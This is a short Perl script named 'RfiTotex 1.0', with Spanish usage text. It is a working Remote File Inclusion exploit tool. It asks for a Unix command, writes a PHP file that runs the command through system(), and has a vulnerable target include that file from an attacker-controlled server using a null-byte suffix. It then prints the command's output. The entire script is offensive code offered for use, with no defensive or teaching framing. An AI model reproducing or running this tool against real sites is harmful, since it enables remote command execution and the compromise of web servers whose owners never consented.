#!/usr/bin/perl
use LWP::Simple;
use Term::ANSIColor;

if(!$ARGV[1]){
print colored ("\n===================================================\n[+]", 'bold blue');
print "\t RfiTotex 1.0 | By MagnoBalt \t\t";print colored ("[+]", 'bold blue');
print colored ("\n===================================================", 'bold blue');

print colored ("\nUso:", 'bold red'); print " perl $0 url_rfi Url_sitiomaligno/path_del_script\n\n";
print colored ("url_rfi:", 'bold red'); print " Es la URL vulnerable a RFI\n";
print colored ("url_sitioatacante:", 'bold red'); print " Es un servidor nuestro con salida a internet. Es decir si yo estubieran en mi server ejecutando este script en una carpeta tools\nla sintaxis quedaria como muestra abajo \n\n";
print colored ("Example:", 'bold red'); print " perl $0 http://www.paginawebvulnerable.com.ar/filevuln.php?variavlevul= http://www.misitio.com.ar/tools/\n";
exit(0)
}

$rfi=$ARGV[0];
$lhost=$ARGV[1];
$archivo="cmd.txt";
open (AR,">".$archivo) || die "No puede crear el archivo error: $!";
print "Escriba el comando Unix a ejecutar en el RFI:  ";
$comando=<STDIN>;
chomp($comando);
print AR "<?\n";
print AR "\$comando_php=\"echo EMPIEZA_AQUI; ".$comando.";echo TERMINA_AQUI\";\n"; 
print AR "system(\$comando_php);\n";
print AR "?>";
close(AR);
$pedido=$rfi.$lhost.$archivo."%00";

$respuesta=get($pedido);

$respuesta=~m/EMPIEZA_AQUI\s*(.*?)\s*TERMINA_AQUI/s;
print "$1\n";
